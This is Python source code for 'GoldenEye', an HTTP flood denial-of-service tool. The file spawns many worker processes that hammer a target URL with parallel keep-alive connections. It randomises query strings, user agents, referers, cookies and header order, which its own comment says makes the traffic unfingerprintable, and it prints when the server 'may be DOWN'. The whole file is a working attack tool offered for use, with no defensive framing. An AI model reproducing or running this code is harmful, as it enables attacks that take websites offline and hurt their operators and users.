"""

"""
import sys, random, getopt, ssl

from http import client as http_client
from multiprocessing import Process, Manager
from urllib import parse

from .settings import DEFAULT_WORKERS, DEFAULT_SOCKETS, METHOD_GET, PLATINUM_EYE_BANNER, DEBUG, JOIN_TIMEOUT
from .settings import SSL_VERIFY, METHOD_POST, METHOD_RAND, USER_AGENT_PARTS


class GoldenEye:
    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):

        # Set URL
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print("Shutting down GoldenEye")

    def __del__(self):
        self.exit()

    def print_banner(self):
        # TODO replace this shit code
        # Taunt!
        print()
        print(PLATINUM_EYE_BANNER)
        print()

    # Do the fun!
    def fire(self):

        self.print_banner()
        print(
        "Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(
            self.method, self.nr_workers, self.nr_sockets))

        if DEBUG:
            print("Starting {0} concurrent workers".format(self.nr_workers))

        # Start workers
        for i in range(int(self.nr_workers)):

            try:
                # TODO need Striker class
                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except (Exception):
                error("Failed to start worker {0}".format(i))
                pass

        if DEBUG:
            print("Initiating monitor")
        self.monitor()

    def stats(self):
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                print("{0} GoldenEye strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1]))
                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print("\tServer may be DOWN!")
                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except Exception:
            # TODO replace Exception with more concrete class
            pass  # silently ignore

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)
                self.stats()
            except (KeyboardInterrupt, SystemExit):
                print("CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print("Killing worker {0}".format(worker.name))
                        # worker.terminate()
                        worker.stop()
                    except Exception as e:
                        pass  # silently ignore
                if DEBUG:
                    raise
                else:
                    pass


class Striker(Process):
    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):

        super(Striker, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = parse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443

        self.referers = [
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://' + self.host + '/'
        ]

    def __del__(self):
        self.stop()

    # builds random ascii string
    def build_block(self, size):
        out_str = ''
        # TODO maybe it's possible to use itertools.chain
        _LOWERCASE = list(range(97, 122))
        _UPPERCASE = list(range(65, 90))
        _NUMERIC = list(range(48, 57))

        valid_chars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(valid_chars)
            out_str += chr(a)

        return out_str

    def run(self):
        if DEBUG:
            print("Starting worker {0}".format(self.name))

        while self.runnable:
            try:

                for i in range(self.nr_socks):

                    if self.ssl:
                        if SSL_VERIFY:
                            c = http_client.HTTPSConnection(self.host, self.port)
                        else:
                            c = http_client.HTTPSConnection(self.host, self.port,
                                                           context=ssl._create_unverified_context())
                    else:
                        c = http_client.HTTPConnection(self.host, self.port)

                    self.socks.append(c)

                for conn_req in self.socks:
                    (url, headers) = self.create_payload()

                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:
                    resp = conn_resp.getresponse()
                    self.inc_counter()

                self.close_connections()

            except:
                self.inc_failed()
                if DEBUG:
                    raise
                else:
                    pass  # silently ignore

        if DEBUG:
            print("Worker {0} completed run. Sleeping...".format(self.name))

    def close_connections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass  # silently ignore

    def create_payload(self):

        req_url, headers = self.generate_data()

        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}

        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return req_url, random_headers

    def generate_query_string(self, amount=1):

        query_string = []

        for i in range(amount):
            key = self.build_block(random.randint(3, 10))
            value = self.build_block(random.randint(3, 20))
            element = "{0}={1}".format(key, value)
            query_string.append(element)

        return '&'.join(query_string)

    def generate_data(self):

        return_code = 0
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = '/'

        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generate_request_url(param_joiner)

        http_headers = self.generate_random_headers()

        return request_url, http_headers

    def generate_request_url(self, param_joiner='?'):

        return self.url + param_joiner + self.generate_query_string(random.randint(1, 5))

    def get_user_agent(self):

        if self.useragents:
            return random.choice(self.useragents)

        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]

        ## Mozilla Version
        mozilla_version = "Mozilla/5.0"  # hardcoded for now, almost every browser is on this version except IE6

        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
        os_name = random.choice(os['name'])
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)

            sysinfo = "%s; %s" % (browser_string, sysinfo)

            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))

        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))

        ua_string = "%s (%s)" % (mozilla_version, sysinfo)

        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))

        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (
            ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0])

        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))

        return ua_string

    def generate_random_headers(self):

        # Random no-cache entries
        no_cache_directives = ['no-cache', 'max-age=0']
        random.shuffle(no_cache_directives)
        nrNoCache = random.randint(1, (len(no_cache_directives) - 1))
        noCache = ', '.join(no_cache_directives[:nrNoCache])

        # Random accept encoding
        accept_encoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
        random.shuffle(accept_encoding)
        nr_encodings = random.randint(1, len(accept_encoding) / 2)
        round_encodings = accept_encoding[:nr_encodings]

        http_headers = {
            'User-Agent': self.get_user_agent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(round_encodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1, 1000),
            'Host': self.host,
        }

        # Randomly-added headers
        # These headers are optional and are
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            accept_charset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(accept_charset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(accept_charset[0], accept_charset[1],
                                                                            round(random.random(), 1),
                                                                            round(random.random(), 1))

        if random.randrange(2) == 0:
            # Random Referer
            url_part = self.build_block(random.randint(5, 10))

            random_referer = random.choice(self.referers) + url_part

            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self.generate_query_string(random.randint(1, 10))

            http_headers['Referer'] = random_referer

        if random.randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generate_query_string(random.randint(1, 5))

        return http_headers

    # Housekeeping
    def stop(self):
        self.runnable = False
        self.close_connections()
        self.terminate()

    # Counter Functions
    def inc_counter(self):
        try:
            self.counter[0] += 1
        except (Exception):
            pass

    def inc_failed(self):
        try:
            self.counter[1] += 1
        except (Exception):
            pass


def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg + "\n"))
    # usage()
    sys.exit(2)


####
# Main
####

def main():
    try:

        if len(sys.argv) < 2:
            error('Please supply at least the URL')

        url = sys.argv[1]

        if url == '-h':
            # usage()
            sys.exit()

        if url[0:4].lower() != 'http':
            error("Invalid URL supplied")

        if url == None:
            error("No URL supplied")

        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:",
                                   ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents"])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        uas_file = None
        useragents = []

        for o, a in opts:
            if o in ("-h", "--help"):
                # usage()
                sys.exit()
            elif o in ("-u", "--useragents"):
                uas_file = a
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-w", "--workers"):
                workers = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-n", "--nosslcheck"):
                global SSLVERIFY
                SSLVERIFY = False
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '" + o + "' doesn't exists")

        if uas_file:
            try:
                with open(uas_file) as f:
                    useragents = f.readlines()
            except EnvironmentError:
                error("cannot read file {0}".format(uas_file))

        goldeneye = GoldenEye(url)
        goldeneye.useragents = useragents
        goldeneye.nr_workers = workers
        goldeneye.method = method
        goldeneye.nr_sockets = socks

        goldeneye.fire()

    except getopt.GetoptError as err:

        # print help information and exit:
        sys.stderr.write(str(err))
        # usage()
        sys.exit(2)
